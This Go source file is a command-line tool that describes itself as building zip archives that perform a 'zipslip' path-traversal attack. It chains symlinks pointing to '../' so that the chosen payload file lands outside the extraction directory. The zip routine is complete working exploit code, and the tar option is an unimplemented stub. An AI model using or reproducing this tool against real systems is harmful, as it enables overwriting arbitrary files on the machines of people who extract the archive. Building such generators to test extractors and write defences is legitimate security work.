package main

import (
	"archive/zip"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/alecthomas/kong"
)

var (
	version = "dev"
	commit  = "none"
	date    = "unknown"
)

var CLI struct {
	InputFile    string           `arg:"" name:"input" help:"Input file."`
	RelativePath string           `arg:"" name:"relative-path" help:"Relative extraction path."`
	Out          string           `arg:"" name:"output-file" type:"path" help:"Output file."`
	ArchiveType  string           `short:"t" default:"zip" help:"Archive type. (tar, zip)"`
	Verbose      bool             `short:"v" optional:"" help:"Verbose logging."`
	Version      kong.VersionFlag `short:"V" optional:"" help:"Print release version information."`
}

func main() {

	// Parse CLI arguments
	kong.Parse(&CLI,
		kong.Description("A utility to build tar/zip archives that performs a zipslip attack."),
		kong.UsageOnError(),
		kong.Vars{
			"version": fmt.Sprintf("%s (%s), commit %s, built at %s", filepath.Base(os.Args[0]), version, commit, date),
		},
	)

	// Check for verbose output
	logLevel := slog.LevelError
	if CLI.Verbose {
		logLevel = slog.LevelDebug
	}

	// setup logger
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{
		Level: logLevel,
	}))

	// LOG CLI arguments
	logger.Debug("CLI arguments", "CLI", CLI)

	switch CLI.ArchiveType {

	case "zip":
		if err := createZip(); err != nil {
			logger.Error("failed to create zip archive", "error", err)
			os.Exit(1)
		}

	case "tar":
		if err := createTar(logger); err != nil {
			logger.Error("failed to create tar archive", "error", err)
			os.Exit(1)
		}

	default:
		logger.Error("invalid archive type", "type", CLI.ArchiveType)
		os.Exit(1)
	}
}

func createZip() error {
	// Create a zip archive

	// create a new zip archive
	zipfile, err := os.Create(CLI.Out)
	if err != nil {
		return fmt.Errorf("failed to create zip file: %s", err)
	}
	defer func() {
		if err := zipfile.Close(); err != nil {
			panic(fmt.Errorf("failed to close zip file: %s", err))
		}
	}()

	// create a new zip writer
	zipWriter := zip.NewWriter(zipfile)
	defer func() {
		if err := zipWriter.Close(); err != nil {
			panic(fmt.Errorf("failed to close zip writer: %s", err))
		}
	}()

	// create basic zip structure
	if err := addFolderToZip(zipWriter, "sub/"); err != nil {
		return fmt.Errorf("failed to add folder 'sub/' to zip: %s", err)
	}
	if err := addSymlinkToZip(zipWriter, "sub/root", "../"); err != nil {
		return fmt.Errorf("failed to add symlink 'sub/root --> ../' to zip: %s", err)
	}
	if err := addSymlinkToZip(zipWriter, "sub/root/outside", "../"); err != nil {
		return fmt.Errorf("failed to add symlink 'sub/root/outside --> ../' to zip: %s", err)
	}

	// check how many traversals are needed
	traversals := strings.Count(CLI.RelativePath, "../")
	basePath := "sub/root/outside"
	for i := 0; i < traversals; i++ {
		basePath = fmt.Sprintf("%s/%v", basePath, i)
		if err := addSymlinkToZip(zipWriter, basePath, "../"); err != nil {
			return fmt.Errorf("failed to add symlink '%s --> ../' to zip: %s", basePath, err)
		}
	}

	// add the file to the zip archive
	filePath := fmt.Sprintf("%s/%s", basePath, CLI.InputFile)
	if err := addFileToZip(zipWriter, CLI.InputFile, filePath); err != nil {
		return fmt.Errorf("failed to add file to zip: %s", err)
	}

	return nil
}

func addFolderToZip(zipWriter *zip.Writer, folder string) error {

	// ensure folder nomenclature
	if !strings.HasSuffix(folder, "/") {
		folder = folder + "/"
	}
	zipHeader := &zip.FileHeader{
		Name:     folder,
		Method:   zip.Store,
		Modified: time.Now(),
	}
	zipHeader.SetMode(os.ModeDir | 0755)

	if _, err := zipWriter.CreateHeader(zipHeader); err != nil {
		return fmt.Errorf("failed to create zip header for directory: %s", err)
	}

	return nil
}

func addFileToZip(zipWriter *zip.Writer, file string, relativePath string) error {

	// open the file
	fileReader, err := os.Open(file)
	if err != nil {
		return fmt.Errorf("failed to open file: %s", err)
	}
	defer fileReader.Close()

	// stat input
	fileInfo, err := fileReader.Stat()
	if err != nil {
		return fmt.Errorf("failed to stat file: %s", err)
	}

	// create a new file header
	zipHeader, err := zip.FileInfoHeader(fileInfo)
	if err != nil {
		return fmt.Errorf("failed to create file header: %s", err)
	}

	// set the name of the file
	zipHeader.Name = relativePath

	// set the method of compression
	zipHeader.Method = zip.Deflate

	// create a new file writer
	writer, err := zipWriter.CreateHeader(zipHeader)
	if err != nil {
		return fmt.Errorf("failed to create zip file header: %s", err)
	}

	// write the file to the zip archive
	if _, err := io.Copy(writer, fileReader); err != nil {
		return fmt.Errorf("failed to write file to zip archive: %s", err)
	}

	return nil
}

func addSymlinkToZip(zipWriter *zip.Writer, symlinkName string, target string) error {

	// create a new file header
	zipHeader := &zip.FileHeader{
		Name:     symlinkName,
		Method:   zip.Store,
		Modified: time.Now(),
	}
	zipHeader.SetMode(os.ModeSymlink | 0755)

	// create a new file writer
	writer, err := zipWriter.CreateHeader(zipHeader)
	if err != nil {
		return fmt.Errorf("failed to create zip header for symlink %s: %s", symlinkName, err)
	}

	// write the symlink to the zip archive
	if _, err := writer.Write([]byte(target)); err != nil {
		return fmt.Errorf("failed to write symlink target %s to zip archive: %s", target, err)
	}

	return nil
}

func createTar(logger *slog.Logger) error {
	panic("not implemented")
}
